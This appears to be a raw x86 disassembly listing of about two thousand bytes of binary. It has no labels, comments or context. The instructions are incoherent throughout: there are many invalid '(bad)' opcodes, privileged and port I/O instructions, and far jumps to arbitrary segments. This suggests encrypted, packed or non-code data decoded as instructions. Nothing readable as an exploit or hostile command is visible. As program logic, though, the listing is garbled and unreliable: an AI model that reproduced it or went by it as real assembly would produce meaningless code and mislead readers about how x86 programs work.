  408bb9:	add    dh,BYTE PTR [edi+0x4c]
  408bbc:	sti    
  408bbd:	jae    0x408b68
  408bbf:	mov    al,0x3c
  408bc1:	cmovp  ebx,DWORD PTR [edi-0x15950f99]
  408bc8:	retf   
  408bc9:	gs inc edx
  408bcb:	fcomp  QWORD PTR [eax]
  408bcd:	dec    bh
  408bcf:	mov    ds:0xc2e6b59c,eax
  408bd4:	inc    ecx
  408bd5:	dec    esp
  408bd6:	jns    0x408c56
  408bd8:	lds    esp,FWORD PTR [ebp+0x6e]
  408bdb:	or     eax,ebp
  408bdd:	push   esi
  408bde:	add    eax,0x968f62
  408be3:	int3   
  408be4:	and    DWORD PTR [ebp+0x22cf9704],edi
  408bea:	xchg   ecx,eax
  408beb:	jbe    0x408b7d
  408bed:	add    dl,dh
  408bef:	add    DWORD PTR [edi+0x24],esi
  408bf2:	or     edx,DWORD PTR [esi-0x6e6184dc]
  408bf8:	push   edi
  408bf9:	(bad)  
  408bfa:	cdq    
  408bfb:	stos   DWORD PTR es:[edi],eax
  408bfc:	mov    gs,WORD PTR [edx+0x78fb0d13]
  408c02:	mov    esp,0x341b98f0
  408c07:	pop    ss
  408c08:	mov    ebx,0x85b72b89
  408c0d:	fst    QWORD PTR [eax+ebp*8]
  408c10:	pop    ebp
  408c11:	xchg   edx,eax
  408c12:	xor    BYTE PTR [ebp-0x8e48606],dl
  408c18:	and    eax,0x5796a2a3
  408c1d:	idiv   BYTE PTR [edx]
  408c1f:	push   eax
  408c20:	cmp    eax,0x7506e674
  408c25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408c26:	jg     0x408bfa
  408c28:	lahf   
  408c29:	xchg   BYTE PTR [esi-0x75f94b4a],bl
  408c2f:	sbb    al,0xe1
  408c31:	cmp    dh,BYTE PTR [edi-0x55]
  408c34:	sub    eax,DWORD PTR [ebx-0x55]
  408c37:	xor    BYTE PTR [edi],ch
  408c39:	mov    dh,0x54
  408c3b:	arpl   WORD PTR [edx+0x20],bx
  408c3e:	add    al,0xe4
  408c40:	adc    esi,DWORD PTR [ebp-0x39]
  408c43:	pop    eax
  408c44:	cdq    
  408c45:	cmp    DWORD PTR [ebx+eax*8+0x39de2411],edi
  408c4c:	jnp    0x408c46
  408c4e:	(bad)  
  408c50:	sub    ah,BYTE PTR [edi]
  408c52:	mov    cl,0x63
  408c54:	and    eax,0xac79ddd7
  408c59:	je     0x408cc3
  408c5b:	add    al,0xb0
  408c5d:	scas   eax,DWORD PTR es:[edi]
  408c5e:	push   ebx
  408c5f:	or     edx,ebx
  408c61:	je     0x408cbd
  408c63:	fnstcw WORD PTR gs:[ebx+0x2e]
  408c67:	test   DWORD PTR [edx],0xa45605ec
  408c6d:	popa   
  408c6e:	(bad)  
  408c6f:	int3   
  408c70:	add    DWORD PTR [esi],edi
  408c72:	cmp    BYTE PTR [ebx+0x1d96fde0],cl
  408c78:	call   0x7acd:0x7fdc9ef2
  408c7f:	cmp    DWORD PTR [edx+0x69628692],ebp
  408c85:	sbb    DWORD PTR [esi],esi
  408c87:	into   
  408c88:	add    bl,BYTE PTR [eax]
  408c8a:	pop    es
  408c8b:	pop    esp
  408c8c:	pop    ebx
  408c8d:	mov    ecx,0x39dcb759
  408c92:	aas    
  408c93:	mov    ebx,DWORD PTR [ecx-0x283597e6]
  408c99:	sbb    eax,0x20c41504
  408c9e:	push   esi
  408c9f:	jns    0x408d0c
  408ca1:	mov    eax,0x93d9444e
  408ca6:	hlt    
  408ca7:	mov    BYTE PTR [ebp+0x7c653b62],bh
  408cad:	inc    esp
  408cae:	outs   dx,BYTE PTR ds:[esi]
  408caf:	ja     0x408cfa
  408cb1:	push   ebx
  408cb2:	jo     0x408d2e
  408cb4:	mov    ecx,0x27823869
  408cb9:	cmp    BYTE PTR ds:0x9308a91b,dl
  408cbf:	adc    al,0xec
  408cc1:	pop    ss
  408cc2:	jle    0x408ceb
  408cc4:	fs sbb eax,0x2ae2f50f
  408cca:	mov    WORD PTR [esi+0x14],ds
  408ccd:	in     eax,0x99
  408ccf:	push   ebx
  408cd0:	std    
  408cd1:	jle    0x408cb0
  408cd3:	lock shl DWORD PTR [edi+eax*4],cl
  408cd7:	pusha  
  408cd8:	repnz sbb BYTE PTR gs:[ecx-0x432579ec],0x9a
  408ce1:	xlat   BYTE PTR ds:[ebx]
  408ce2:	loope  0x408cdd
  408ce4:	mov    esi,0x3ce656a3
  408ce9:	ret    
  408cea:	push   esi
  408ceb:	jb     0x408ce6
  408ced:	repnz lock mov DWORD PTR [eax+ebp*8-0x3d],edi
  408cf3:	pop    edi
  408cf4:	pop    ecx
  408cf5:	fwait
  408cf6:	or     eax,0x3ae7f165
  408cfb:	sub    al,0x83
  408cfd:	xchg   ecx,eax
  408cfe:	cmp    dl,BYTE PTR [esp+edi*1]
  408d01:	ret    
  408d02:	jl     0x408d5a
  408d04:	jnp    0x408d15
  408d06:	test   al,0x91
  408d08:	mov    eax,0xc441abbf
  408d0d:	mov    ebp,0xa0017274
  408d12:	ins    BYTE PTR es:[edi],dx
  408d13:	jno    0x408d75
  408d15:	pop    ecx
  408d16:	out    dx,eax
  408d17:	in     eax,0xe3
  408d19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408d1a:	das    
  408d1b:	mov    ecx,0x96158f4
  408d20:	hlt    
  408d21:	add    DWORD PTR [ebx-0x2d0c5798],ebp
  408d27:	adc    BYTE PTR [esi+0x585bc049],dh
  408d2d:	xchg   ebx,eax
  408d2e:	iret   
  408d2f:	fist   DWORD PTR ds:0xf3a8e0bc
  408d35:	das    
  408d36:	in     al,dx
  408d37:	cdq    
  408d38:	jmp    0x45d9:0x1a7f4674
  408d3f:	adc    al,ch
  408d41:	pop    ebx
  408d42:	in     eax,dx
  408d43:	pop    ebp
  408d44:	pop    ds
  408d45:	mov    BYTE PTR [eax],bh
  408d47:	scas   eax,DWORD PTR es:[edi]
  408d48:	mov    ch,0x82
  408d4a:	data16 outs dx,BYTE PTR ds:[esi]
  408d4c:	pop    DWORD PTR [ebx]
  408d4e:	pop    ds
  408d4f:	popa   
  408d50:	push   ds
  408d51:	jae    0x408d7b
  408d53:	xchg   ebp,eax
  408d54:	jp     0x408cd7
  408d56:	mov    cs,WORD PTR [esi-0x25c4754]
  408d5c:	fild   DWORD PTR [ebp-0x23]
  408d5f:	inc    esp
  408d60:	push   es
  408d61:	lea    ecx,[esi-0x6b]
  408d64:	pop    es
  408d65:	les    ecx,FWORD PTR [esi]
  408d67:	out    dx,eax
  408d68:	jge    0x408cfc
  408d6a:	push   esi
  408d6b:	jmp    0x33e:0x39ec05b2
  408d72:	nop
  408d73:	sub    BYTE PTR [edi],bh
  408d75:	jecxz  0x408dc2
  408d77:	xlat   BYTE PTR ds:[ebx]
  408d78:	adc    esp,ecx
  408d7a:	mov    ecx,0x67753976
  408d7f:	ja     0x408dc0
  408d81:	imul   ecx,DWORD PTR [eax-0x79bc0048],0x75761dbf
  408d8b:	cld    
  408d8c:	ins    BYTE PTR es:[edi],dx
  408d8d:	int    0xe9
  408d8f:	sub    edx,ebx
  408d91:	dec    esp
  408d92:	add    ah,al
  408d94:	push   edi
  408d95:	pop    ecx
  408d96:	mov    al,ds:0x65a97e5b
  408d9b:	push   es
  408d9c:	dec    edi
  408d9d:	inc    ecx
  408d9e:	dec    BYTE PTR [ebx-0x317687e5]
  408da4:	and    DWORD PTR [esi+eiz*4],ebp
  408da7:	div    DWORD PTR [ebp+0x12]
  408daa:	pop    ebx
  408dab:	pop    DWORD PTR [edi+0x28fcd332]
  408db1:	scas   al,BYTE PTR es:[edi]
  408db2:	retf   0xd02
  408db5:	gs loop 0x408e30
  408db8:	jns    0x408dd3
  408dba:	xor    dh,BYTE PTR [edi]
  408dbc:	jne    0x408d7f
  408dbe:	enter  0x5361,0x63
  408dc2:	cs cwde 
  408dc4:	xchg   ebp,eax
  408dc5:	and    ch,BYTE PTR ds:0x5cd20f3d
  408dcb:	adc    DWORD PTR [edi-0x60],ebp
  408dce:	jmp    0x408d79
  408dd0:	fld    QWORD PTR [ecx]
  408dd2:	fadd   DWORD PTR [edx-0x34]
  408dd5:	iret   
  408dd6:	sbb    al,0xbc
  408dd8:	jl     0x408d9e
  408dda:	arpl   WORD PTR [ebx-0xa0e68dd],cx
  408de0:	ret    
  408de1:	fisub  DWORD PTR es:[esi-0x3a]
  408de5:	add    al,0xcd
  408de7:	ins    BYTE PTR es:[edi],dx
  408de8:	push   esi
  408de9:	repz mov ebp,0xc8f18f2a
  408def:	and    eax,0x6dbc0f9b
  408df4:	cdq    
  408df5:	and    al,0x6c
  408df7:	(bad)  
  408df9:	jnp    0x408e2b
  408dfb:	mov    ebp,0xa0f353f5
  408e00:	imul   edi,DWORD PTR cs:[esi],0xffffffb2
  408e04:	in     al,dx
  408e05:	pop    edi
  408e06:	aam    0xc
  408e08:	and    ebp,DWORD PTR [ecx-0x2d]
  408e0b:	sbb    BYTE PTR [eax],ch
  408e0d:	es add ebx,eax
  408e10:	sahf   
  408e11:	repnz push edx
  408e13:	mov    bl,0xcd
  408e15:	sub    DWORD PTR [ecx+0x553bfde8],ebx
  408e1b:	aam    0x92
  408e1d:	xor    esp,DWORD PTR [ebx]
  408e1f:	je     0x408dbd
  408e21:	stos   DWORD PTR es:[edi],eax
  408e22:	loop   0x408dcf
  408e24:	pop    ecx
  408e25:	add    al,0x56
  408e27:	cwde   
  408e28:	icebp  
  408e29:	out    0x45,al
  408e2b:	mov    edx,DWORD PTR [esi+0x47]
  408e2e:	cmp    BYTE PTR [ecx+esi*4-0x161fd58c],0xfa
  408e36:	cmp    eax,0x4dad96c7
  408e3b:	jle    0x408e8c
  408e3d:	aaa    
  408e3e:	jg     0x408ea0
  408e40:	lods   eax,DWORD PTR ds:[esi]
  408e41:	xor    BYTE PTR [esi+0x5a8c7ebd],cl
  408e47:	test   BYTE PTR [esi],bl
  408e49:	(bad)  
  408e4a:	enter  0x2227,0x1d
  408e4e:	inc    esi
  408e4f:	pop    ebp
  408e50:	sbb    DWORD PTR [edi+0x4b],0x9601e657
  408e57:	scas   eax,DWORD PTR es:[edi]
  408e58:	dec    esi
  408e59:	daa    
  408e5a:	pop    esi
  408e5b:	mov    al,ds:0x8e208a9c
  408e60:	iret   
  408e61:	shl    DWORD PTR [esi-0x9],1
  408e64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408e65:	bound  ebp,QWORD PTR [edx]
  408e67:	pusha  
  408e68:	int3   
  408e69:	pop    es
  408e6a:	xchg   DWORD PTR [ebx],edi
  408e6c:	push   es
  408e6d:	out    0xd8,al
  408e6f:	sub    edi,DWORD PTR [edx+0xd0fd5d]
  408e75:	dec    ebx
  408e76:	mov    al,ds:0x777e7dd2
  408e7b:	add    eax,0xe29f32f6
  408e80:	adc    bl,ch
  408e82:	sti    
  408e83:	hlt    
  408e84:	scas   eax,DWORD PTR es:[edi]
  408e85:	mov    dh,0xe8
  408e87:	loop   0x408ec3
  408e89:	fldl2t 
  408e8b:	leave  
  408e8c:	jle    0x408e72
  408e8e:	rol    edi,1
  408e90:	or     dh,BYTE PTR [edx+0x377c5503]
  408e96:	jo     0x408e29
  408e98:	fisubr DWORD PTR ds:0xcdbdb7dd
  408e9e:	cli    
  408e9f:	sub    ch,dl
  408ea1:	leave  
  408ea2:	pop    esp
  408ea3:	repz or ch,dl
  408ea6:	jns    0x408edf
  408ea8:	repz out 0x52,al
  408eab:	(bad)  
  408ead:	aam    0x6c
  408eaf:	mov    eax,ds:0x4cb175ee
  408eb4:	mov    ebp,0x9bc28410
  408eb9:	loop   0x408ee1
  408ebb:	jp     0x408ed8
  408ebd:	gs xchg edx,eax
  408ebf:	out    dx,al
  408ec0:	mov    ds:0x52f3fef2,al
  408ec5:	dec    ebp
  408ec6:	xchg   ecx,eax
  408ec7:	and    eax,0xaf28ad67
  408ecc:	(bad)  
  408ecd:	xlat   BYTE PTR ds:[ebx]
  408ece:	inc    esp
  408ecf:	cmp    eax,0x457ddc95
  408ed4:	test   bl,dh
  408ed6:	pop    es
  408ed7:	(bad)  
  408ed8:	mov    BYTE PTR [edx-0x4c],bl
  408edb:	mov    edi,DWORD PTR gs:[esi-0x581ff2e9]
  408ee2:	(bad)  [eax]
  408ee4:	in     al,dx
  408ee5:	mov    eax,?
  408ee7:	rcr    ebx,1
  408ee9:	push   edx
  408eea:	shl    edx,cl
  408eec:	hlt    
  408eed:	mov    ds:0x194a7f5a,eax
  408ef2:	fs test bh,al
  408ef5:	mov    dh,0x4d
  408ef7:	inc    esp
  408ef8:	dec    eax
  408ef9:	push   esi
  408efa:	in     al,0x20
  408efc:	test   DWORD PTR [edi+edi*8+0x64d4bb93],0x465d6252
  408f07:	mov    ch,0x48
  408f09:	icebp  
  408f0a:	pusha  
  408f0b:	retf   
  408f0c:	aaa    
  408f0d:	into   
  408f0e:	aad    0x75
  408f10:	sub    ebp,ebp
  408f12:	popa   
  408f13:	inc    ebx
  408f14:	nop
  408f15:	call   0x275d:0x3457d33d
  408f1c:	mov    ch,bl
  408f1e:	(bad)  
  408f1f:	bound  ebp,QWORD PTR [ebx+ebx*8-0x763a15e]
  408f26:	mov    edi,0xbe115961
  408f2b:	pop    esi
  408f2c:	icebp  
  408f2d:	or     ecx,0x8ac92094
  408f33:	jge    0x408f4a
  408f35:	mov    WORD PTR [edx+esi*1+0x47aee62],cs
  408f3c:	sub    eax,0x4d1ff6e3
  408f41:	fld    QWORD PTR [ebx]
  408f43:	aad    0x6d
  408f45:	push   0x4f48ec41
  408f4a:	test   DWORD PTR [edx+0xa],eax
  408f4d:	and    DWORD PTR [ebx-0x7d],ecx
  408f50:	push   es
  408f51:	push   ss
  408f52:	enter  0x4d2f,0x76
  408f56:	mov    dl,0x4c
  408f58:	sub    dh,bh
  408f5a:	dec    ebp
  408f5b:	in     al,0xa5
  408f5d:	loopne 0x408f4b
  408f5f:	xor    ch,BYTE PTR [ecx-0x17]
  408f62:	jl     0x408ef1
  408f64:	inc    eax
  408f65:	jno    0x408f97
  408f67:	or     al,0x2b
  408f69:	mov    dl,0x51
  408f6b:	inc    ecx
  408f6c:	add    DWORD PTR [ecx+0x32],eax
  408f6f:	stc    
  408f70:	out    dx,eax
  408f71:	rol    BYTE PTR [edx+ecx*2],1
  408f74:	jb     0x408f7f
  408f76:	mov    al,ds:0x27611889
  408f7b:	pusha  
  408f7c:	mov    esp,0x74d3beab
  408f81:	ins    DWORD PTR es:[edi],dx
  408f82:	imul   esi,esi,0x4d
  408f85:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408f86:	jmp    0x49a8:0xbdbf20f6
  408f8d:	mov    ds:0xf1a4d661,al
  408f92:	pop    ebx
  408f93:	outs   dx,DWORD PTR ds:[esi]
  408f94:	and    eax,DWORD PTR [ecx]
  408f96:	pushf  
  408f97:	and    al,0x4d
  408f99:	push   es
  408f9a:	scas   al,BYTE PTR es:[edi]
  408f9b:	or     DWORD PTR es:[edx-0x77c76ae7],edi
  408fa2:	js     0x408f30
  408fa4:	mov    WORD PTR [eax+0xe],?
  408fa7:	jp     0x408f72
  408fa9:	mov    ds:0xba4437db,eax
  408fae:	mov    al,ds:0x825a6e40
  408fb3:	xor    DWORD PTR [edx],ebx
  408fb5:	jg     0x408f51
  408fb7:	ret    
  408fb8:	cmc    
  408fb9:	xor    ah,ah
  408fbb:	or     dl,dl
  408fbd:	addr16 jo 0x408ff2
  408fc0:	mul    DWORD PTR [ebp-0x35]
  408fc3:	or     eax,0xe3da85b9
  408fc8:	repnz inc eax
  408fca:	adc    edi,DWORD PTR [ebp+0x3]
  408fcd:	scas   al,BYTE PTR es:[edi]
  408fce:	mov    eax,esi
  408fd0:	adc    edi,esi
  408fd2:	sbb    al,0x39
  408fd4:	imul   bh
  408fd6:	push   edx
  408fd7:	(bad)  
  408fd8:	fisubr WORD PTR [eax+0x7e]
  408fdb:	pop    ds
  408fdc:	aas    
  408fdd:	test   BYTE PTR [ecx+0x1e3fda2a],dh
  408fe3:	or     eax,0x4c2deaf1
  408fe8:	test   eax,0x1e1b2a15
  408fed:	bound  eax,QWORD PTR [edi+0x1a]
  408ff0:	inc    ebp
  408ff1:	cwde   
  408ff2:	in     al,0xc4
  408ff4:	mov    edi,0x8dd82977
  408ff9:	push   eax
  408ffa:	pop    ebp
  408ffb:	or     bl,ch
  408ffd:	push   ebx
  408ffe:	pop    esi
  408fff:	mov    esp,0xd4ed322
  409004:	and    al,0xf4
  409006:	rcr    BYTE PTR [edx],cl
  409008:	je     0x40901f
  40900a:	sub    BYTE PTR [esi+0x6c90c163],bl
  409010:	push   edi
  409011:	hlt    
  409012:	xor    DWORD PTR [ebx],edi
  409014:	adc    al,0x31
  409016:	xchg   edx,eax
  409017:	adc    DWORD PTR [ecx],ebx
  409019:	jno    0x409092
  40901b:	dec    edi
  40901c:	mov    BYTE PTR [ebp+0x22],bl
  40901f:	pop    eax
  409020:	xchg   edi,eax
  409021:	adc    eax,0x6bbd01e3
  409026:	scas   eax,DWORD PTR es:[edi]
  409027:	and    DWORD PTR [esi-0x17],0x41
  40902b:	sti    
  40902c:	(bad)  
  40902d:	sbb    dl,dh
  40902f:	scas   eax,DWORD PTR es:[edi]
  409030:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409031:	and    ebp,DWORD PTR [eax-0x16]
  409034:	(bad)  
  409036:	cld    
  409037:	daa    
  409038:	sbb    bh,BYTE PTR [ebp+0x6edd687d]
  40903e:	inc    esi
  40903f:	das    
  409040:	add    eax,0xdd41b5eb
  409045:	jg     0x409099
  409047:	loope  0x4090c8
  409049:	mov    ebx,0x54c5e2ef
  40904e:	stc    
  40904f:	dec    edx
  409050:	push   eax
  409051:	dec    edi
  409052:	xchg   DWORD PTR [eax+0x50],edx
  409055:	stc    
  409056:	mov    BYTE PTR [edi-0x5d],bl
  409059:	in     eax,0xb4
  40905b:	cmc    
  40905c:	int    0xd6
  40905e:	xchg   esp,eax
  40905f:	mov    dl,0xd0
  409061:	lods   eax,DWORD PTR ds:[esi]
  409062:	stos   BYTE PTR es:[edi],al
  409063:	cld    
  409064:	cmp    al,0x16
  409066:	push   esp
  409067:	lods   eax,DWORD PTR ds:[esi]
  409068:	fldenv [eax-0x5e]
  40906b:	mov    dh,0x36
  40906d:	leave  
  40906e:	add    BYTE PTR [ebx-0x12],0x6e
  409072:	xchg   esi,eax
  409073:	sbb    ecx,DWORD PTR [ebp-0x5d199654]
  409079:	arpl   WORD PTR [edx],dx
  40907b:	push   0x18
  40907d:	fld    QWORD PTR [ebx+eiz*1+0x2ce33ca6]
  409084:	jo     0x4090b4
  409086:	or     ebp,eax
  409088:	push   cs
  409089:	cmc    
  40908a:	mov    DWORD PTR [ecx-0x18625fa],eax
  409090:	jne    0x40906c
  409092:	pop    ecx
  409093:	push   edi
  409094:	enter  0x4505,0xab
  409098:	jg     0x409090
  40909a:	jnp    0x40906b
  40909c:	clc    
  40909d:	mov    ds,WORD PTR [edi-0x37]
  4090a0:	popa   
  4090a1:	dec    edi
  4090a2:	mov    WORD PTR [edx],es
  4090a4:	fld    QWORD PTR [esi-0x51cb2117]
  4090aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4090ab:	mov    BYTE PTR [ebp+0xe],ah
  4090ae:	jnp    0x4090cd
  4090b0:	repz push ebp
  4090b2:	push   esi
  4090b3:	dec    edi
  4090b4:	jge    0x4090db
  4090b6:	fnstsw WORD PTR [ecx-0x2b4a5625]
  4090bc:	inc    esp
  4090bd:	loopne 0x4090c4
  4090bf:	push   ebp
  4090c0:	mov    eax,edi
  4090c2:	(bad)  
  4090c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4090c4:	aad    0xeb
  4090c6:	add    al,0x88
  4090c8:	js     0x409064
  4090ca:	dec    ebx
  4090cb:	test   BYTE PTR [ebx-0x1b4881ee],bl
  4090d1:	jmp    0x409096
  4090d3:	dec    ecx
  4090d4:	dec    esp
  4090d5:	sbb    al,BYTE PTR [esi]
  4090d7:	jg     0x409152
  4090d9:	test   al,0x12
  4090db:	outs   dx,BYTE PTR ds:[esi]
  4090dc:	mov    dh,BYTE PTR [edi]
  4090de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4090df:	jg     0x4090ae
  4090e1:	add    DWORD PTR [edi-0x2d38b8aa],edi
  4090e7:	call   0x9a92f97f
  4090ec:	cwde   
  4090ed:	inc    eax
  4090ee:	out    dx,al
  4090ef:	fild   QWORD PTR [eax]
  4090f1:	mov    ch,0xb0
  4090f3:	push   cs
  4090f4:	jnp    0x4090c4
  4090f6:	int3   
  4090f7:	mov    edx,0xbeb72d83
  4090fc:	dec    ecx
  4090fd:	jno    0x4090bd
  4090ff:	jl     0x409086
  409101:	and    al,0x38
  409103:	js     0x4090ac
  409105:	dec    ecx
  409106:	inc    ebx
  409107:	inc    ebx
  409108:	pop    ebx
  409109:	popa   
  40910a:	add    eax,0x88794665
  40910f:	or     ebp,DWORD PTR [ebp+0x66]
  409112:	gs pushf 
  409114:	mov    al,BYTE PTR [eax]
  409116:	xchg   ecx,eax
  409117:	inc    esi
  409118:	outs   dx,DWORD PTR ds:[esi]
  409119:	jp     0x4090c0
  40911b:	call   0x708:0xd1900089
  409122:	mov    ch,0x92
  409124:	sub    BYTE PTR [esi+0x6b463ad9],0x40
  40912b:	sub    ebx,DWORD PTR [ebx+0x3b]
  40912e:	or     esp,DWORD PTR [ecx-0x3c]
  409131:	add    DWORD PTR [ebx],edx
  409133:	jle    0x4090b8
  409135:	jbe    0x4090d8
  409137:	jle    0x409106
  409139:	enter  0x9d7,0xde
  40913d:	out    dx,eax
  40913e:	pushf  
  40913f:	xchg   edi,eax
  409140:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  409142:	aaa    
  409143:	sbb    DWORD PTR [eax],ecx
  409145:	std    
  409146:	cmp    cl,BYTE PTR [ebp-0x24]
  409149:	fld    QWORD PTR [edx-0x4b02a3e0]
  40914f:	(bad)  
  409150:	loopne 0x4091cd
  409152:	mov    ds:0xb2231a5,al
  409157:	and    ebp,DWORD PTR [ebp+ebx*1-0x8164a50]
  40915e:	push   ebp
  40915f:	jbe    0x4091d9
  409161:	xor    BYTE PTR [ecx-0x4b64de77],ah
  409167:	jnp    0x4091d6
  409169:	dec    edx
  40916a:	int3   
  40916b:	out    dx,eax
  40916c:	not    dl
  40916e:	pop    es
  40916f:	xor    BYTE PTR [edx],0x85
  409172:	(bad)  
  409173:	jb     0x409193
  409175:	jp     0x4091f4
  409177:	pop    edx
  409178:	scas   eax,DWORD PTR es:[edi]
  409179:	imul   ebx,DWORD PTR [ebx-0x69],0x3d
  40917d:	push   DWORD PTR [edi+0x46]
  409180:	fcomp  st(7)
  409182:	scas   eax,DWORD PTR es:[edi]
  409183:	hlt    
  409184:	test   eax,0xef61321d
  409189:	pop    ds
  40918a:	or     DWORD PTR [ecx+0x507d58e0],ebx
  409190:	daa    
  409191:	cmp    BYTE PTR [ecx-0x2e],ah
  409194:	push   ds
  409195:	clc    
  409196:	int3   
  409197:	pop    ss
  409198:	daa    
  409199:	mov    ch,0x2
  40919b:	sbb    DWORD PTR [edi],0x43fefbc2
  4091a1:	pop    ecx
  4091a2:	stos   DWORD PTR es:[edi],eax
  4091a3:	jno    0x40919d
  4091a5:	inc    esi
  4091a6:	sar    DWORD PTR [eax],0x8a
  4091a9:	icebp  
  4091aa:	int3   
  4091ab:	mov    edi,0xd3d6fa0f
  4091b0:	push   ds
  4091b1:	ds es or eax,eax
  4091b5:	scas   eax,DWORD PTR es:[edi]
  4091b6:	lock es (bad) 
  4091b9:	lock arpl WORD PTR [edi],bx
  4091bc:	mov    edx,0x18caa788
  4091c1:	xor    BYTE PTR [ebx-0x2c701ce8],bl
  4091c7:	iret   
  4091c8:	loop   0x40921e
  4091ca:	jno    0x4091c4
  4091cc:	push   edx
  4091cd:	or     dh,BYTE PTR es:[edx]
  4091d0:	repz jne 0x4091a4
  4091d3:	(bad)  
  4091d4:	sub    BYTE PTR [esi+ecx*1],bh
  4091d7:	shl    BYTE PTR [eax],1
  4091d9:	pop    esi
  4091da:	sub    BYTE PTR [ecx+ecx*1-0x711a1fe6],ch
  4091e1:	and    al,0x81
  4091e3:	and    BYTE PTR [ebp+0x6d],cl
  4091e6:	adc    al,0x4
  4091e8:	inc    esi
  4091e9:	neg    esi
  4091eb:	or     al,0x91
  4091ed:	ret    0x9f85
  4091f0:	or     al,0xdb
  4091f2:	leave  
  4091f3:	mov    ?,WORD PTR [esi-0x1a]
  4091f6:	add    al,0xa3
  4091f8:	adc    eax,0xfa29afbb
  4091fd:	pop    eax
  4091fe:	loop   0x4091c1
  409200:	adc    DWORD PTR [eax+edi*4],0x4a
  409204:	push   edx
  409205:	cmp    ecx,DWORD PTR [edi-0x13]
  409208:	add    al,0xd1
  40920a:	and    edi,ebx
  40920c:	pop    edx
  40920d:	mov    DWORD PTR [edi],edi
  40920f:	sahf   
  409210:	add    DWORD PTR [ebp-0x79],eax
  409213:	lock out 0xde,eax
  409216:	adc    DWORD PTR [ecx-0x25],ecx
  409219:	cmp    BYTE PTR [edi],ah
  40921b:	lods   al,BYTE PTR ds:[esi]
  40921c:	cmc    
  40921d:	lods   eax,DWORD PTR ds:[esi]
  40921e:	inc    eax
  40921f:	pop    esi
  409220:	jno    0x409219
  409222:	adc    cl,BYTE PTR [edi]
  409224:	addr16 adc bh,dh
  409227:	out    dx,al
  409228:	xchg   ebp,eax
  409229:	mov    ah,0x25
  40922b:	repz sub al,0x2c
  40922e:	(bad)
  409232:	jmp    0x722a:0x5306c49c
  409239:	loopne 0x409234
  40923b:	addr16 imul ecx,ebp,0x6f
  40923f:	ja     0x409218
  409241:	inc    edi
  409242:	pop    es
  409243:	push   esp
  409244:	aaa    
  409245:	cld    
  409246:	pop    eax
  409247:	stc    
  409248:	xchg   edi,eax
  409249:	retf   0x188e
  40924c:	xor    esi,esi
  40924e:	not    BYTE PTR [edi+ebx*8]
  409251:	xchg   ebp,eax
  409252:	lods   al,BYTE PTR ds:[esi]
  409253:	push   ss
  409254:	mov    ebx,0x501a9cdd
  409259:	add    bh,BYTE PTR [ecx-0x57]
  40925c:	or     al,0x8e
  40925e:	das    
  40925f:	mov    ebx,0x44111b1b
  409264:	mov    gs,esp
  409266:	xor    ch,BYTE PTR [edx-0x7ad6942b]
  40926c:	nop
  40926d:	inc    edi
  40926f:	(bad)
  409272:	jno    0x409263
  409274:	test   eax,0x50215118
  409279:	mov    dl,0xf4
  40927b:	jg     0x4092c8
  40927d:	out    dx,al
  40927e:	in     eax,0x56
  409280:	mov    eax,ds:0x46fe73ee
  409285:	gs pusha 
  409287:	jne    0x4092eb
  409289:	frstor [ecx]
  40928b:	cwde   
  40928c:	or     eax,0x65627209
  409291:	iret   
  409292:	jne    0x409267
  409294:	mov    ecx,0x8afb5e04
  409299:	js     0x40926a
  40929b:	pop    es
  40929c:	xor    BYTE PTR [edx],0xe0
  40929f:	data16 jb 0x40926f
  4092a2:	add    al,0x75
  4092a4:	scas   al,BYTE PTR es:[edi]
  4092a5:	std    
  4092a6:	jns    0x40931d
  4092a8:	fcomp  DWORD PTR [ecx+0x60]
  4092ab:	xchg   BYTE PTR [ebp-0x6f28b5e7],ch
  4092b1:	inc    esi
  4092b2:	fadd   DWORD PTR [edi+0x32]
  4092b5:	test   BYTE PTR [eax+0x532a05a1],bh
  4092bb:	xor    edx,DWORD PTR [eax+0x60aef9d2]
  4092c1:	add    bh,BYTE PTR [esi-0x8683752]
  4092c7:	fistp  WORD PTR [ebp-0x306e925a]
  4092cd:	sbb    BYTE PTR [eax],cl
  4092cf:	mov    al,ds:0x2d8c133a
  4092d4:	mov    edx,edi
  4092d6:	ret    
  4092d7:	lea    edi,[edx]
  4092d9:	sub    esi,edi
  4092db:	inc    edx
  4092dc:	je     0x40934e
  4092de:	daa    
  4092df:	jge    0x4092a7
  4092e1:	inc    esp
  4092e2:	mov    dh,0x95
  4092e4:	add    eax,0xfb955617
  4092e9:	xchg   BYTE PTR [ebp+ebx*8+0x62],cl
  4092ed:	(bad)  
  4092ef:	aaa    
  4092f0:	inc    esi
  4092f1:	sbb    DWORD PTR [edi],esp
  4092f3:	fstp   DWORD PTR [ebx+0x9]
  4092f6:	out    dx,eax
  4092f7:	ficomp DWORD PTR [edi+edi*8+0x2b61eae]
  4092fe:	jg     0x409363
  409300:	push   ss
  409301:	stos   BYTE PTR es:[edi],al
  409302:	pop    esp
  409303:	in     al,dx
  409304:	push   ecx
  409305:	pushf  
  409306:	icebp  
  409307:	push   cs
  409308:	loope  0x40932a
  40930a:	and    DWORD PTR [edi+0x11],eax
  40930d:	sti    
  40930e:	and    eax,DWORD PTR ds:0x8a915963
  409314:	jb     0x409325
  409316:	or     BYTE PTR [esi],bl
  409318:	jle    0x4092b3
  40931a:	ds mov esp,0x6beaa523
  409320:	add    BYTE PTR [ecx-0x48911477],0x23
  409327:	mov    bl,0xbc
  409329:	xor    eax,0xf36bbe15
  40932e:	es in  eax,0x4
  409331:	mov    eax,ds:0x92a3c19a
  409336:	in     eax,dx
  409337:	mov    cl,0x59
  409339:	cmp    eax,0xe18f973b
  40933e:	dec    edi
  40933f:	cdq    
  409340:	jmp    0x6eb0:0x9d5c8244
  409347:	test   eax,0xe587aac2
  40934c:	inc    esp
  40934d:	outs   dx,DWORD PTR ds:[esi]
  40934e:	dec    eax
  40934f:	outs   dx,BYTE PTR ds:[esi]
  409350:	sbb    ebx,DWORD PTR [edi+0xd9ebfc]
  409356:	jne    0x409353
  409358:	push   ebp
  409359:	test   al,0xcf
  40935b:	and    eax,ebp
  40935d:	push   ecx
